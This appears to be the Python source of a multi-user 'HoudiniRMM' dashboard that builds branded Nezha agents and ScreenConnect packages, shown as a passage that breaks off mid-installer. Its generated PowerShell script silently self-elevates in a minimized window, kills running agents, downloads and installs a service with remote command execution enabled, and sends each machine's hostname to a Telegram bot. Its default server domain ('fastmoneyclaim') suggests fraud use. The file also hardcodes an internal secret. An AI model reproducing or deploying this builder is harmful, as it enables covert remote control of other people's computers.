#!/usr/bin/env python3
"""HoudiniRMM Dashboard (Devices + Packages) served at /dashboard/."""
from __future__ import annotations

import http.cookiejar
import json
import os
import re
import secrets
import shutil
import tempfile
import threading
import time
import urllib.error
import urllib.request
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import houdini_features as hf

BASE = Path("/opt/nezha/agent-builder")
DATA = BASE / "data"
CACHE = BASE / "cache"
OUT = BASE / "out"
BRANDING_PATH = DATA / "branding.json"
ICON_PATH = DATA / "icon.png"
# Sync builder icon to Nezha dashboard on startup
try:
    if ICON_PATH.exists():
        import shutil as _sh
        _ud = Path("/opt/nezha/dashboard/user-dist")
        _ud.mkdir(parents=True, exist_ok=True)
        _sh.copy2(ICON_PATH, _ud / "logo.png")
        _sh.copy2(ICON_PATH, _ud / "favicon.png")
except Exception:
    pass
HOST = "127.0.0.1"
PORT = 8091
START_TIME = time.time()
URL_PREFIXES = ("/dashboard/agent-builder", "/dashboard")  # longest first
LOGIN_PAGE = Path(__file__).with_name("login.html")
INTERNAL_HEADER = "X-Houdini-Internal"
INTERNAL_SECRET = "houdini-internal-builder"
DASHBOARD = "http://127.0.0.1:8008"
ADMIN_PASS_FILE = Path("/root/.nezha_admin_pass")
TG_PATH = DATA / "tg_config.json"
TG_STATE_PATH = DATA / "tg_state.json"

def load_tg_state() -> dict:
    try:
        return json.loads(TG_STATE_PATH.read_text(encoding="utf-8"))
    except Exception:
        return {}

def save_tg_state(state: dict) -> None:
    try:
        TG_STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
    except Exception:
        pass

def user_tg_path(uid: int) -> Path:
    """Per-user Telegram config path. Admin (uid=0 or 1) uses the global path."""
    if uid in (0, 1):
        return TG_PATH
    return DATA / f"tg_config_user_{uid}.json"

def load_tg_for(uid: int) -> dict:
    try:
        return json.loads(user_tg_path(uid).read_text(encoding="utf-8"))
    except Exception:
        return {}

def save_tg_for(uid: int, data: dict) -> None:
    with lock:
        user_tg_path(uid).parent.mkdir(parents=True, exist_ok=True)
        user_tg_path(uid).write_text(json.dumps(data, indent=2), encoding="utf-8")
SCREENCONNECT_DIR = DATA / "screenconnect"

def user_screenconnect_dir(uid: int) -> Path:
    """Per-user ScreenConnect MSI directory. Admin (uid=0 or 1) uses the global dir."""
    if uid in (0, 1):
        return SCREENCONNECT_DIR
    d = DATA / "screenconnect" / f"user_{uid}"
    d.mkdir(parents=True, exist_ok=True)
    return d
SIGNED_EXE = CACHE / "agent-signed.exe"
NOTIF_PATH = DATA / "notifications.json"
CLAIM_TOKENS_PATH = DATA / "claim_tokens.json"
BUILD_OWNERS_PATH = DATA / "build_owners.json"
CFG_PATH = DATA / "houdini_cfg.json"


def load_build_owners() -> dict:
    try:
        return json.loads(BUILD_OWNERS_PATH.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_build_owners(data: dict) -> None:
    with lock:
        BUILD_OWNERS_PATH.parent.mkdir(parents=True, exist_ok=True)
        # Prune entries for files that no longer exist in OUT/
        existing = {x.name for x in OUT.glob("*")} if OUT.exists() else set()
        data = {k: v for k, v in data.items() if k in existing}
        BUILD_OWNERS_PATH.write_text(json.dumps(data, indent=2))


def set_build_owner(filename: str, uid: int) -> None:
    owners = load_build_owners()
    owners[filename] = uid
    save_build_owners(owners)


def get_build_owner(filename: str) -> int:
    return load_build_owners().get(filename, 0)  # 0 = admin/unknown

_BUILD_HISTORY = {}
_CLAIM_ATTEMPTS = {}

def can_build(uid: int) -> bool:
    now = time.time()
    if uid not in _BUILD_HISTORY:
        _BUILD_HISTORY[uid] = []
    _BUILD_HISTORY[uid] = [t for t in _BUILD_HISTORY[uid] if now - t < 3600]
    if len(_BUILD_HISTORY[uid]) >= 5:
        return False
    _BUILD_HISTORY[uid].append(now)
    return True

def check_claim_rate(ip: str) -> bool:
    now = time.time()
    if ip not in _CLAIM_ATTEMPTS:
        _CLAIM_ATTEMPTS[ip] = []
    _CLAIM_ATTEMPTS[ip] = [t for t in _CLAIM_ATTEMPTS[ip] if now - t < 60]
    if len(_CLAIM_ATTEMPTS[ip]) >= 3:
        return False
    _CLAIM_ATTEMPTS[ip].append(now)
    return True

def safe_shell_str(s: str) -> str:
    return re.sub(r"[^a-zA-Z0-9_\-\.]", "", str(s))[:40]

def redact_token(s: str) -> str:
    if not s:
        return ""
    if len(s) > 8:
        return s[:8] + "..." + s[-4:]
    return "..."

def cleanup_old_builds():
    """Delete builds older than 7 days, keeping at least 5 latest per user."""
    try:
        owners = load_build_owners()
        by_user = {}
        for fname, uid in owners.items():
            fp = OUT / fname
            if not fp.exists():
                continue
            by_user.setdefault(uid, []).append((fp.stat().st_mtime, fname))
        for uid, files in by_user.items():
            files.sort(reverse=True)
            if len(files) > 5:
                for _, fname in files[5:]:
                    (OUT / fname).unlink(missing_ok=True)
        now = time.time()
        for fp in OUT.glob("*"):
            try:
                if now - fp.stat().st_mtime > 7 * 86400:
                    fp.unlink(missing_ok=True)
            except Exception:
                pass
    except Exception:
        pass

def _global_agent_secret() -> str:
    """Get the global agent_secret_key from the Nezha dashboard config.
    This is the secret that agents must use to connect via gRPC."""
    try:
        import yaml as _yaml
        cfg = _yaml.safe_load(Path("/opt/nezha/dashboard/data/config.yaml").read_text(encoding="utf-8"))
        return str(cfg.get("agent_secret_key") or "")
    except Exception:
        return str(load_branding().get("client_secret") or "")

def load_cfg() -> dict:
    try:
        return json.loads(CFG_PATH.read_text(encoding="utf-8"))
    except Exception:
        return {}

def load_hidden_devices(uid: int) -> list:
    """Load list of device IDs hidden by a specific user."""
    try:
        data = json.loads((DATA / f"hidden_devices_{uid}.json").read_text(encoding="utf-8"))
        return data if isinstance(data, list) else []
    except Exception:
        return []

def save_hidden_devices(uid: int, ids: list):
    """Save list of device IDs hidden by a specific user."""
    try:
        (DATA / f"hidden_devices_{uid}.json").write_text(json.dumps(ids), encoding="utf-8")
    except Exception:
        pass

def hide_device_for_user(uid: int, device_id: int):
    """Add a device to the user's hidden list."""
    hidden = load_hidden_devices(uid)
    if device_id not in hidden:
        hidden.append(device_id)
        save_hidden_devices(uid, hidden)

def unhide_device_for_user(uid: int, device_id: int):
    """Remove a device from the user's hidden list (e.g. when device is reinstalled)."""
    hidden = load_hidden_devices(uid)
    if device_id in hidden:
        hidden.remove(device_id)
        save_hidden_devices(uid, hidden)

def save_cfg(cfg: dict) -> None:
    try:
        CFG_PATH.parent.mkdir(parents=True, exist_ok=True)
        CFG_PATH.write_text(json.dumps(cfg, indent=2), encoding="utf-8")
    except Exception:
        pass

def cfg_get(key: str, default=None):
    return load_cfg().get(key, default)

def load_notifs() -> list[dict]:
    try:
        return json.loads(NOTIF_PATH.read_text(encoding="utf-8"))
    except Exception:
        return []

def save_notifs(data: list[dict]) -> None:
    NOTIF_PATH.parent.mkdir(parents=True, exist_ok=True)
    NOTIF_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")

def load_claim_tokens() -> dict:
    try:
        return json.loads(CLAIM_TOKENS_PATH.read_text(encoding="utf-8"))
    except Exception:
        return {}

def save_claim_tokens(data: dict) -> None:
    CLAIM_TOKENS_PATH.parent.mkdir(parents=True, exist_ok=True)
    CLAIM_TOKENS_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")

def create_claim_token(user_id: int, agent_secret: str) -> str:
    """Create a short-lived claim token tied to a user's agent_secret."""
    token = secrets.token_urlsafe(24)
    tokens = load_claim_tokens()
    # Clean expired tokens (24h TTL)
    now = time.time()
    tokens = {k: v for k, v in tokens.items() if now - v.get("ts", 0) < 86400}
    tokens[token] = {"user_id": user_id, "agent_secret": agent_secret, "ts": now}
    save_claim_tokens(tokens)
    return token

def resolve_claim_token(token: str):
    """Return (user_id, agent_secret) for a valid token, or None."""
    if not token:
        return None
    tokens = load_claim_tokens()
    entry = tokens.get(token)
    if not entry:
        return None
    if time.time() - entry.get("ts", 0) > 86400:
        del tokens[token]
        save_claim_tokens(tokens)
        return None
    return entry.get("user_id"), entry.get("agent_secret")

def add_notif(title: str, body: str, kind: str = "info") -> None:
    with lock:
        notifs = load_notifs()
        notifs.insert(0, {
            "id": secrets.token_hex(6),
            "ts": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            "title": title,
            "body": body,
            "kind": kind,
        })
        if len(notifs) > 100:
            notifs = notifs[:100]
        save_notifs(notifs)

AGENT_VERSION = "v2.3.1"
OFFICIAL = {
    "windows": {
        "url": "https://github.com/nezhahq/agent/releases/download/v2.3.1/nezha-agent_windows_amd64.zip",
        "zip": "nezha-agent_windows_amd64.zip",
        "inner": "nezha-agent.exe",
    },
    "linux": {
        "url": "https://github.com/nezhahq/agent/releases/download/v2.3.1/nezha-agent_linux_amd64.zip",
        "zip": "nezha-agent_linux_amd64.zip",
        "inner": "nezha-agent",
    },
    "darwin": {
        "url": "https://github.com/nezhahq/agent/releases/download/v2.3.1/nezha-agent_darwin_amd64.zip",
        "zip": "nezha-agent_darwin_amd64.zip",
        "inner": "nezha-agent",
    },
}

# Cross-platform-ish agent uninstall script run by Nezha task system
UNINSTALL_CMD = r"""
set +e
# Linux / systemd (default official path)
if [ -x /opt/nezha/agent/nezha-agent ]; then
  /opt/nezha/agent/nezha-agent service -c /opt/nezha/agent/config.yml uninstall 2>/dev/null
fi
# Any executable next to config.yml under /opt/nezha/agent
if [ -f /opt/nezha/agent/config.yml ]; then
  for b in /opt/nezha/agent/*; do
    [ -x "$b" ] || continue
    "$b" service -c /opt/nezha/agent/config.yml uninstall 2>/dev/null
  done
fi
systemctl stop nezha-agent 2>/dev/null
systemctl disable nezha-agent 2>/dev/null
rm -rf /opt/nezha/agent
# Windows (if task runs under cmd/powershell wrapper the agent uses)
if command -v sc.exe >/dev/null 2>&1 || [ -n "$WINDIR" ]; then
  true
fi
echo HOUDINI_UNINSTALL_DONE
""".strip()

lock = threading.Lock()


_branding_cache = {"data": None, "ts": 0}
_BRANDING_TTL = 5

def load_branding() -> dict:
    now = time.time()
    if _branding_cache["data"] is not None and (now - _branding_cache["ts"]) < _BRANDING_TTL:
        return _branding_cache["data"]
    try:
        data = json.loads(BRANDING_PATH.read_text(encoding="utf-8"))
    except Exception:
        data = {}
    _branding_cache["data"] = data
    _branding_cache["ts"] = now
    return data


def save_branding(data: dict) -> None:
    with lock:
        BRANDING_PATH.parent.mkdir(parents=True, exist_ok=True)
        BRANDING_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")
        _branding_cache["data"] = data
        _branding_cache["ts"] = time.time()


def load_tg() -> dict:
    try:
        return json.loads(TG_PATH.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_tg(data: dict) -> None:
    with lock:
        TG_PATH.parent.mkdir(parents=True, exist_ok=True)
        TG_PATH.write_text(json.dumps(data, indent=2), encoding="utf-8")


def tg_send(bot_token: str, chat_id: str, text: str) -> dict:
    import urllib.parse as _up

    payload = {"chat_id": chat_id, "text": text}
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = _up.urlencode(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        raw = urllib.request.urlopen(req, timeout=15).read().decode(errors="replace")
        return {"ok": True, "response": raw}
    except urllib.error.HTTPError as e:
        return {"ok": False, "error": e.read().decode(errors="replace")}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def tg_config_active() -> dict:
    """Return active Telegram config; empty dict when not configured/enabled."""
    c = load_tg()
    token = (c.get("bot_token") or "").strip()
    chat = (c.get("chat_id") or "").strip()
    if not token or not chat:
        return {}
    return {"bot_token": token, "chat_id": chat, "monitor": bool(c.get("monitor", True))}


def tg_config_active_for(uid: int) -> dict:
    """Return active Telegram config for a specific user. Admin (uid=0/1) uses global."""
    c = load_tg_for(uid)
    token = (c.get("bot_token") or "").strip()
    chat = (c.get("chat_id") or "").strip()
    if not token or not chat:
        return {}
    return {"bot_token": token, "chat_id": chat, "monitor": bool(c.get("monitor", True))}


def tg_esc(s) -> str:
    return str(s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


TG_EVENT_TITLES = {
    "install_start": "Agent Install Started",
    "install_ok": "Agent Installed",
    "install_fail": "Agent Install Failed",
    "uninstall": "Agent Uninstalled",
    "start": "Agent Started",
    "stop": "Agent Stopped",
    "online": "Agent Online",
    "offline": "Agent Offline",
    "new_device": "New Device Detected",
    "gone": "Device Removed",
    "update": "Agent Updated",
    "test": "Test Message",
}
TG_EVENT_ICONS = {
    "install_start": "[START]",
    "install_ok": "[OK]",
    "install_fail": "[FAIL]",
    "uninstall": "[UNINSTALL]",
    "start": "[START]",
    "stop": "[STOP]",
    "online": "[ONLINE]",
    "offline": "[OFFLINE]",
    "new_device": "[NEW]",
    "gone": "[GONE]",
    "update": "[UPDATE]",
    "test": "[TEST]",
}


def tg_format_msg(event: str, fields: dict, status: str | None = None, ok: bool | None = None, product: str = "HoudiniRMM") -> str:
    """Plain-text Telegram message for a lifecycle event."""
    title = TG_EVENT_TITLES.get(event, event.replace("_", " ").title())
    icon = TG_EVENT_ICONS.get(event, "[INFO]")
    if ok is False:
        icon = "[FAIL]"
    line = "-" * 24
    head = f"{icon} {tg_esc(product)} - {tg_esc(title)}"
    rows = [head, line]
    for k, v in (fields or {}).items():
        if v is None or str(v) == "":
            continue
        rows.append(f"* {tg_esc(k)} : {tg_esc(v)}")
    rows.append(line)
    if status:
        emoji = "[OK]" if ok is not False else "[FAIL]"
        rows.append(f"{emoji} Status : {tg_esc(status)}")
    rows.append(f"[TIME] {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    return "\n".join(rows)


def tg_report_action(event: str, fields: dict, status: str | None = None, ok: bool | None = None, product: str = "HoudiniRMM") -> bool:
    """Send a formatted report to the configured Telegram chat. Returns True if sent."""
    tg = tg_config_active()
    if not tg:
        return False
    text = tg_format_msg(event, fields, status=status, ok=ok, product=product)
    res = tg_send(tg.get("bot_token", ""), tg.get("chat_id", ""), text)
    return bool(res.get("ok"))


def safe_name(name: str) -> str:
    name = re.sub(r"[^\w\-. ]+", "", name or "Agent").strip()
    name = re.sub(r"\s+", "-", name)
    return name[:40] or "Agent"


def ensure_official(platform: str, force: bool = False) -> Path:
    """Download official agent zip for platform; re-fetch when version pin changes."""
    meta = OFFICIAL[platform]
    path = CACHE / meta["zip"]
    ver_path = CACHE / f"{meta['zip']}.version"
    cached_ver = ver_path.read_text(encoding="utf-8").strip() if ver_path.exists() else ""
    need = force or not path.exists() or path.stat().st_size < 1_000_000 or cached_ver != AGENT_VERSION
    if not need:
        return path
    CACHE.mkdir(parents=True, exist_ok=True)
    tmp = path.with_suffix(".part")
    print(f"downloading agent {AGENT_VERSION} {platform} from {meta['url']}")
    try:
        urllib.request.urlretrieve(meta["url"], tmp)
    except Exception as e:
        if tmp.exists():
            tmp.unlink(missing_ok=True)
        if path.exists():
            print(f"download failed ({e}), using cached copy")
            return path
        raise RuntimeError(f"failed to download agent {platform}: {e}")
    tmp.replace(path)
    ver_path.write_text(AGENT_VERSION, encoding="utf-8")
    return path


def make_config(b: dict) -> str:
    """Full Nezha agent config.yml from wiki (all documented keys)."""
    def yn(v):
        return "true" if v else "false"

    def bget(key, default=False):
        return yn(bool(b[key]) if key in b else default)

    ip_report = int(b.get("ip_report_period") or 1800)
    if ip_report < 30:
        ip_report = 30
    report_delay = int(b.get("report_delay") or 3)
    if report_delay < 1:
        report_delay = 1
    if report_delay > 4:
        report_delay = 4
    self_upd = int(b.get("self_update_period") or 0)

    lines = [
        "# Generated by HoudiniRMM — full Nezha agent options (nezha.wiki)",
        f"client_secret: {b['client_secret']}",
        f"server: {b['server']}",
        f"tls: {bget('tls', True)}",
        f"debug: {bget('debug', False)}",
        f"disable_auto_update: {bget('disable_auto_update', False)}",
        f"disable_command_execute: {bget('disable_command_execute', False)}",
        f"disable_force_update: {bget('disable_force_update', False)}",
        f"disable_nat: {bget('disable_nat', False)}",
        f"disable_send_query: {bget('disable_send_query', False)}",
        f"gpu: {bget('gpu', False)}",
        f"insecure_tls: {bget('insecure_tls', False)}",
        f"ip_report_period: {ip_report}",
        f"report_delay: {report_delay}",
        f"self_update_period: {self_upd}",
        f"skip_connection_count: {bget('skip_connection_count', False)}",
        f"skip_procs_count: {bget('skip_procs_count', False)}",
        f"temperature: {bget('temperature', False)}",
        f"use_atomgit_to_upgrade: {bget('use_atomgit_to_upgrade', False)}",
        f"use_gitee_to_upgrade: {bget('use_gitee_to_upgrade', False)}",
        f"use_ipv6_country_code: {bget('use_ipv6_country_code', False)}",
    ]
    # Enrollment token for user builds — used by install script to claim device
    enroll_token = str(b.get("enrollment_token") or "").strip()
    if enroll_token:
        lines.append(f"# enrollment_token: {enroll_token}")

    # optional list/map fields
    dns = b.get("dns") or []
    if isinstance(dns, str):
        dns = [x.strip() for x in dns.split(",") if x.strip()]
    if dns:
        lines.append("dns:")
        for d in dns[:20]:
            lines.append(f"  - {d}")

    custom_ip = b.get("custom_ip_api") or []
    if isinstance(custom_ip, str):
        custom_ip = [x.strip() for x in custom_ip.split(",") if x.strip()]
    if custom_ip:
        lines.append("custom_ip_api:")
        for u in custom_ip[:20]:
            lines.append(f"  - {u}")

    parts = b.get("hard_drive_partition_allowlist") or []
    if isinstance(parts, str):
        parts = [x.strip() for x in parts.split(",") if x.strip()]
    if parts:
        lines.append("hard_drive_partition_allowlist:")
        for p in parts[:40]:
            lines.append(f"  - {p}")

    nics = b.get("nic_allowlist")
    if isinstance(nics, str) and nics.strip():
        try:
            nics = json.loads(nics)
        except Exception:
            # eth0,true1 form
            nics = {x.strip(): True for x in nics.split(",") if x.strip()}
    if isinstance(nics, dict) and nics:
        lines.append("nic_allowlist:")
        for k, v in list(nics.items())[:40]:
            lines.append(f"  {k}: {yn(bool(v))}")

    return "\n".join(lines) + "\n"


AGENT_BOOL_KEYS = [
    "tls",
    "debug",
    "disable_auto_update",
    "disable_command_execute",
    "disable_force_update",
    "disable_nat",
    "disable_send_query",
    "gpu",
    "insecure_tls",
    "skip_connection_count",
    "skip_procs_count",
    "temperature",
    "use_atomgit_to_upgrade",
    "use_gitee_to_upgrade",
    "use_ipv6_country_code",
]
AGENT_INT_KEYS = ["ip_report_period", "report_delay", "self_update_period"]
AGENT_STRLIST_KEYS = ["dns", "custom_ip_api", "hard_drive_partition_allowlist"]


def powershell_install_script(b: dict) -> str:
    """Generate a PowerShell script that downloads the full RMM package ZIP, unzips, and installs as a service."""
    product = safe_name(b.get("product_name") or "HoudiniRMM")
    server = str(b.get("server") or "").strip()
    srv_host = server.split(":")[0].strip() if server else "rmm.houdini.fastmoneyclaim.com"
    secret = str(b.get("client_secret") or "").strip()
    service_name = product
    agent_bin = product + ".exe"
    install_dir = f"%ProgramFiles%\\{product}"
    tg = tg_config_active()
    tg_token = tg.get("bot_token", "")
    tg_chat = tg.get("chat_id", "")

    p = f"""<#
.SYNOPSIS
    RMM Agent Installer — kills all running agent processes and services before installation.
.DESCRIPTION
    Downloads the agent package from the RMM server and installs it as a service.
.PARAMETER ServerUrl
    Base URL of the RMM server.
.PARAMETER EnrollToken
    Enrollment token (reserved for future use).
.PARAMETER AgentUrl
    Optional: custom URL for the agent package ZIP. Defaults to /dashboard/api/package-zip.
#>
param(
    [string]$ServerUrl = "https://{srv_host}",
    [string]$EnrollToken = "",
    [string]$AgentUrl = ""
)

#region [AUTO-ELEVATE]
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Write-Host "Not running as administrator – relaunching elevated..." -ForegroundColor Yellow
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {{ $scriptPath = $MyInvocation.ScriptName }}
    if ($scriptPath) {{
        $params = @()
        if ($ServerUrl) {{ $params += "-ServerUrl `"$ServerUrl`"" }}
        if ($EnrollToken) {{ $params += "-EnrollToken `"$EnrollToken`"" }}
        if ($AgentUrl) {{ $params += "-AgentUrl `"$AgentUrl`"" }}
        Start-Process powershell.exe -Verb RunAs -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Minimized -File `"$scriptPath`" $($params -join ' ')"
    }}
    exit 0
}}
#endregion

#region [TELEGRAM REPORTING]
$global:TgToken = "{tg_token}"
$global:TgChat = "{tg_chat}"
$global:TgProduct = "{product}"

function Send-TgReport {{
    param([string]$Event, [string]$Status = "", [hashtable]$Fields = @{{}})
    if (-not $global:TgToken -or -not $global:TgChat) {{ return }}
    $titles = @{{
        install_start = 'Install Started'; install_ok = 'Install Succeeded'; install_fail = 'Install Failed';
        uninstall = 'Uninstalled'; start = 'Started'; stop = 'Stopped';
        online = 'Online'; offline = 'Offline'; test = 'Test'
    }}
    $icons = @{{
        install_start = '[START]'; install_ok = '[OK]'; install_fail = '[FAIL]';
        uninstall = '[UNINSTALL]'; start = '[START]'; stop = '[STOP]'; online = '[ONLINE]'; offline = '[OFFLINE]'; test = '[TEST]'
    }}
    $icon = $icons[$Event]; if (-not $icon) {{ $icon = '[INFO]' }}
    $title = $titles[$Event]; if (-not $title) {{ $title = $Event }}
    $line = "------------------------"
    $msg = "$icon $global:TgProduct - $title`n$line`n"
    foreach ($k in $Fields.Keys) {{
        $v = [string]$Fields[$k]
        if ($v) {{ $msg += "* $k : $v`n" }}
    }}
    $msg += "$line`n"
    if ($Status) {{
        $emoji = '[OK]'
        if ($Status -match 'fail|error') {{ $emoji = '[FAIL]' }}
        $msg += "$emoji Status : $Status`n"
    }}
    $msg += "[TIME] $([DateTime]::UtcNow.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
    try {{
        $body = @{{ chat_id = $global:TgChat; text = $msg; parse_mode = '' }}
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$global:TgToken/sendMessage" -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' | Out-Null
    }} catch {{
        Write-Host "  [TG] send failed: $($_.Exception.Message)" -ForegroundColor DarkGray
    }}
}}
#endregion

#region [MAIN]
$ErrorActionPreference = "Stop"
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  {product} Agent Installer" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "Server : $ServerUrl" -ForegroundColor Gray
Write-Host ""

Send-TgReport -Event 'install_start' -Status "Starting installation" -Fields @{{ 'Host' = $env:COMPUTERNAME; 'Server' = $ServerUrl }}

# ---- Prepare paths ----
$base = [Environment]::ExpandEnvironmentVariables("{install_dir}")
$agent = Join-Path $base "{agent_bin}"
$cfg = Join-Path $base "config.yml"
$serviceName = "{service_name}"

# ---- PHASE 0: STOP ANY RUNNING INSTANCE ----
Write-Host "[0] Stopping any running agent processes/services..." -ForegroundColor Cyan

$processNames = @("{product}", "{service_name}", "nezha-agent")
foreach ($name in $processNames) {{
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}}
Write-Host "  [OK] Killed any running agent processes." -ForegroundColor Gray

$svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if ($svc) {{
    Write-Host "  Stopping service '$serviceName'..." -ForegroundColor Gray
    Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Test-Path $agent) {{
        Write-Host "  Uninstalling old service via binary..." -ForegroundColor Gray
        & $agent service -c $cfg uninstall 2>$null | Out-Null
        Start-Sleep -Seconds 2
    }}
    $stale = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if ($stale) {{
        Write-Host "  Force-deleting stale service..." -ForegroundColor Gray
        sc.exe delete $serviceName 2>$null | Out-Null
        Start-Sleep -Seconds 1
    }}
}}

if (Test-Path $agent) {{
    Write-Host "  Removing old binary..." -ForegroundColor Gray
    Remove-Item $agent -Force -ErrorAction SilentlyContinue
}}
if (Test-Path $base) {{
    Write-Host "  Cleaning up residual files..." -ForegroundColor Gray
    Remove-Item -Recurse -Force "$base\\*" -ErrorAction SilentlyContinue
}}
if (-not (Test-Path $base)) {{
    New-Item -ItemType Directory -Force -Path $base | Out-Null
}}
Write-Host "  [OK] Cleaned up previous installation." -ForegroundColor Green

# ---- PHASE 1: DOWNLOAD PACKAGE ----
Write-Host "[1] Downloading agent package..." -ForegroundColor Cyan
if (-not $AgentUrl) {{
    $AgentUrl = "$ServerUrl/dashboard/api/package-zip"
}}
$zip = Join-Path $env:TEMP "rmm-package.zip"
$extract = Join-Path $env:TEMP "rmm-extract"

if (Test-Path $zip) {{ Remove-Item $zip -Force -ErrorAction SilentlyContinue }}
if (Test-Path $extract) {{ Remove-Item -Recurse -Force $extract -ErrorAction SilentlyContinue }}

Invoke-WebRequest -UseBasicParsing -Uri $AgentUrl -OutFile $zip -ErrorAction Stop
Expand-Archive -Path $zip -DestinationPath $extract -Force

$pkgFolder = Get-ChildItem -Path $extract -Directory | Select-Object -First 1
if (-not $pkgFolder) {{ throw "Package folder not found in ZIP" }}
Write-Host "  [OK] Package extracted: $($pkgFolder.FullName)" -ForegroundColor Gray

# ---- PHASE 2: DEPLOY FILES ----
Write-Host "[2] Deploying agent files..." -ForegroundColor Cyan

$sourceExe = Join-Path $pkgFolder.FullName "{agent_bin}"
if (-not (Test-Path $sourceExe)) {{ throw "{agent_bin} not found in package" }}
Copy-Item -Path $sourceExe -Destination $agent -Force
Write-Host "  [OK] Binary deployed: $agent" -ForegroundColor Gray

$srcCfg = Join-Path $pkgFolder.FullName "config.yml"
if (Test-Path $srcCfg) {{
    Copy-Item -Path $srcCfg -Destination $cfg -Force
}} else {{
    @"
# Generated by {product}
client_secret: {secret}
server: {server}
tls: true
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 3
self_update_period: 1
skip_connection_count: false
skip_procs_count: false
temperature: false
use_atomgit_to_upgrade: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
"@ | Set-Content -Path $cfg -Encoding UTF8 -Force
}}
Write-Host "  [OK] Config deployed: $cfg" -ForegroundColor Gray

# ---- PHASE 3: INSTALL SERVICE ----
Write-Host "[3] Installing service..." -ForegroundColor Cyan

$staleCheck = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if ($staleCheck) {{
    sc.exe delete $serviceName 2>$null | Out-Null
    Start-Sleep -Seconds 1
}}

& $agent service -c $cfg install
if ($LASTEXITCODE -ne 0) {{
    Send-TgReport -Event 'install_fail' -Status "Service install failed (exit code $LASTEXITCODE)"
    throw "Service install failed (exit code $LASTEXITCODE)"
}}
Write-Host "  [OK] Service installed as '$serviceName'" -ForegroundColor Green

# ---- PHASE 4: START SERVICE ----
Write-Host "[4] Starting service..." -ForegroundColor Cyan

Start-Service -Name $serviceName -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

$svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if ($svc.Status -eq 'Running') {{
    Write-Host "  [OK] Service running" -ForegroundColor Green
    Send-TgReport -Event 'start' -Status "Service started" -Fields @{{ 'Host' = $env:COMPUTERNAME; 'Service' = $serviceName }}
}} else {{
    Write-Host "  [WARN] Service not running – starting manually..." -ForegroundColor Yellow
    & $agent service -c $cfg start
    Start-Sleep -Seconds 2
    $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if ($svc.Status -eq 'Running') {{
        Write-Host "  [OK] Service started manually" -ForegroundColor Green
    }}
}}

# ---- PHASE 5: VERIFICATION ----
Write-Host "[5] Verification..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

$proc = Get-Process -Name "{product}" -ErrorAction SilentlyContinue
if ($proc) {{
    Write-Host "  [OK] Agent running (PID: $($proc.Id))" -ForegroundColor Green
    Send-TgReport -Event 'install_ok' -Status "Agent installed and running" -Fields @{{ 'Host' = $env:COMPUTERNAME; 'PID' = $proc.Id }}
}} else {{
    Write-Host "  [WARN] Agent process not found – check manually" -ForegroundColor Yellow
    Send-TgReport -Event 'install_ok' -Status "Agent installed (process check pending)" -Fields @{{ 'Host' = $env:COMPUTERNAME }}
}}

# ---- CLEANUP ----
Remove-Item $zip -Force -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $extract -ErrorAction SilentlyContinue
Write-Host "  [OK] Temporary files cleaned." -ForegroundColor Gray

# ---- PHASE 6: CLAIM DEVICE (if enrollment token present) ----
$enrollToken = ""
if (Test-Path $cfg) {{
    $cfgContent = Get-Content $cfg -Raw -ErrorAction SilentlyContinue
    if ($cfgContent -match "^#\s*enrollment_token:\s*(.+)$") {{
        $enrollToken = $Matches[1].Trim()
    }}
}}
if ($enrollToken) {{
    Write-Host "[6] Claiming device with enrollment token..." -ForegroundColor Cyan
    Write-Host "  Waiting for agent to register with server..." -ForegroundColor Gray
    $claimed = $false
    for ($i = 0; $i -lt 12; $i++) {{
        Start-Sleep -Seconds 5
        $agentUuid = ""
        if (Test-Path $cfg) {{
            $cfgContent2 = Get-Content $cfg -Raw -ErrorAction SilentlyContinue
            if ($cfgContent2 -match "^uuid:\s*(.+)$") {{
                $agentUuid = $Matches[1].Trim()
            }}
        }}
        if (-not $agentUuid) {{
            # UUID not in config yet — the agent generates it on first run
            # Try reading from the agent's auto-generated UUID file
            $uuidFile = Join-Path $base "uuid"
            if (Test-Path $uuidFile) {{
                $agentUuid = (Get-Content $uuidFile -Raw).Trim()
            }}
        }}
        if (-not $agentUuid) {{
            Write-Host "  Waiting for agent UUID... ($($i+1)/12)" -ForegroundColor Gray
            continue
        }}
        Write-Host "  Agent UUID: $agentUuid" -ForegroundColor Gray
        try {{
